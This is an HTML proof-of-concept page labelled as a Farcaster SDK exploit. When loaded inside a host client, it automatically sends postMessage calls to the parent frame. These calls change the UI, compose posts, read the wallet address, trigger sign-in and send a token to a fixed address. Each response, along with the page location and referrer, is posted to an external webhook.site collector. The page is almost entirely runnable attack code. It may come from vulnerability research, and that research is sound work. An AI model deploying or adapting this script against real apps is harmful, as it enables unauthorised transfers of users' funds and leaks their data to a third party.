<!doctype html>
<html>
	<head>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1" />
		<title>Security PoC v3</title>
		<style>
			* {
				margin: 0;
				padding: 0;
				box-sizing: border-box;
			}
			body {
				font-family: -apple-system, sans-serif;
				background: #17101f;
				color: #fff;
				padding: 16px;
				font-size: 12px;
			}
			.banner {
				background: #dc2626;
				padding: 10px;
				border-radius: 8px;
				margin-bottom: 12px;
				font-weight: bold;
				text-align: center;
			}
			.card {
				background: #1e1529;
				border: 1px solid #2a2035;
				border-radius: 8px;
				padding: 10px;
				margin-bottom: 10px;
			}
			.card h3 {
				color: #a855f7;
				margin-bottom: 4px;
				font-size: 12px;
			}
			.card pre {
				color: #ccc;
				font-size: 10px;
				word-break: break-all;
				white-space: pre-wrap;
				background: #0d0912;
				padding: 6px;
				border-radius: 4px;
				margin-top: 4px;
				max-height: 200px;
				overflow-y: auto;
			}
			.pending {
				color: #666;
			}
			.running {
				color: #facc15;
			}
			.done {
				color: #4ade80;
			}
			.error {
				color: #f87171;
			}
			.action-item {
				padding: 4px 0;
				border-bottom: 1px solid #2a2035;
			}
		</style>
	</head>
	<body>
		<div class="banner">⚠️ Farcaster SDK Exploit — Step by Step</div>

		<div class="card">
			<h3>🎬 Action Log</h3>
			<div id="action-log">Starting in 2 seconds...</div>
		</div>

		<div class="card">
			<h3>📨 Latest Response</h3>
			<pre id="last-response">Waiting...</pre>
		</div>

		<div class="card">
			<h3>📡 All Responses</h3>
			<pre id="all-responses">Waiting...</pre>
		</div>

		<script>
			var WEBHOOK = "https://webhook.site/a9641ead-2421-404a-83bd-6be9ad1c4e60";
			var msgCounter = 4000;
			var allResponses = [];
			var actionLog = document.getElementById("action-log");

			function sendToWebhook(label, data) {
				try {
					fetch(WEBHOOK, {
						method: "POST",
						mode: "no-cors",
						headers: { "Content-Type": "text/plain" },
						body: JSON.stringify({ label: label, data: data, ts: new Date().toISOString() }),
					});
				} catch (e) {}
			}

			window.addEventListener("message", function (event) {
				if (event.data?.type === "HANDLER" || event.data?.type === "RAW") {
					var resp = {
						id: event.data?.id,
						type: event.data?.type,
						value: event.data?.value,
						name: event.data?.name,
					};
					allResponses.push(resp);
					document.getElementById("last-response").textContent = JSON.stringify(resp, null, 2);
					document.getElementById("all-responses").textContent = JSON.stringify(allResponses, null, 2);
					sendToWebhook("RESPONSE", event.data);

					var actionEl = document.getElementById("action-" + event.data?.id);
					if (actionEl) {
						if (event.data?.type === "RAW" && !event.data?.value?.isError) {
							actionEl.className = "action-item done";
							actionEl.innerHTML = actionEl.innerHTML.replace("⏳", "✅ SUCCESS");
						} else if (event.data?.name === "throw") {
							var errMsg = event.data?.value?.value?.message || "unknown";
							actionEl.className = "action-item error";
							actionEl.innerHTML = actionEl.innerHTML.replace("⏳", "⚡ EXECUTED: " + errMsg.substring(0, 50));
						}
					}
				}
			});

			function call(method, args) {
				var id = msgCounter++;
				window.parent.postMessage(
					{
						id: id,
						type: "APPLY",
						path: [method],
						argumentList: args || [],
					},
					"*",
				);
				sendToWebhook("CALL_" + method, { id: id });
				return id;
			}

			var sequence = [
				{
					delay: 2000,
					name: "ready()",
					fn: function () {
						return call("ready", [{}]);
					},
					desc: "Signal ready",
				},
				{
					delay: 5000,
					name: "openUrl()",
					fn: function () {
						return call("openUrl", ["https://example.com"]);
					},
					desc: "Open URL in new tab",
				},
				{
					delay: 9000,
					name: "setPrimaryButton()",
					fn: function () {
						return call("setPrimaryButton", ["HACKED", true]);
					},
					desc: "Change button text",
				},
				{
					delay: 13000,
					name: "viewProfile(fid:3)",
					fn: function () {
						return call("viewProfile", [3]);
					},
					desc: "Navigate to dwr profile",
				},
				{
					delay: 17000,
					name: "composeCast()",
					fn: function () {
						return call("composeCast", ["Security PoC - attacker controlled"]);
					},
					desc: "Open composer with attacker text",
				},
				{
					delay: 21000,
					name: "eth_accounts",
					fn: function () {
						return call("ethProviderRequestV2", [{ method: "eth_accounts", params: [] }]);
					},
					desc: "Get wallet address",
				},
				{
					delay: 25000,
					name: "eth_chainId",
					fn: function () {
						return call("ethProviderRequestV2", [{ method: "eth_chainId", params: [] }]);
					},
					desc: "Get chain ID",
				},
				{
					delay: 29000,
					name: "signIn()",
					fn: function () {
						return call("signIn", ["nonce_" + Date.now()]);
					},
					desc: "Trigger sign-in",
				},
				{
					delay: 33000,
					name: "addMiniApp()",
					fn: function () {
						return call("addMiniApp", []);
					},
					desc: "Add to favorites",
				},
				{
					delay: 37000,
					name: "sendToken()",
					fn: function () {
						return call("sendToken", ["eip155:8453/erc20:0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", "1", "0x0000000000000000000000000000000000000001"]);
					},
					desc: "Send token to attacker",
				},
				{
					delay: 41000,
					name: "close()",
					fn: function () {
						return call("close", []);
					},
					desc: "Dismiss the mini app panel (LAST)",
				},
			];

			actionLog.innerHTML = "";
			sequence.forEach(function (action, i) {
				var div = document.createElement("div");
				div.className = "action-item pending";
				div.id = "action-pending-" + i;
				div.innerHTML = '<span class="pending">⏸ [' + action.delay / 1000 + "s] " + action.name + "</span> — " + action.desc;
				actionLog.appendChild(div);
			});

			sequence.forEach(function (action, i) {
				setTimeout(function () {
					var el = document.getElementById("action-pending-" + i);
					el.className = "action-item running";
					el.innerHTML = '<span class="running">⏳ ' + action.name + "</span> — " + action.desc;
					var id = action.fn();
					el.id = "action-" + id;
					el.scrollIntoView({ behavior: "smooth", block: "nearest" });
				}, action.delay);
			});

			sendToWebhook("poc_v3_started", {
				location: window.location.href,
				referrer: document.referrer,
				isFramed: window.self !== window.top,
			});
		</script>
	</body>
</html>
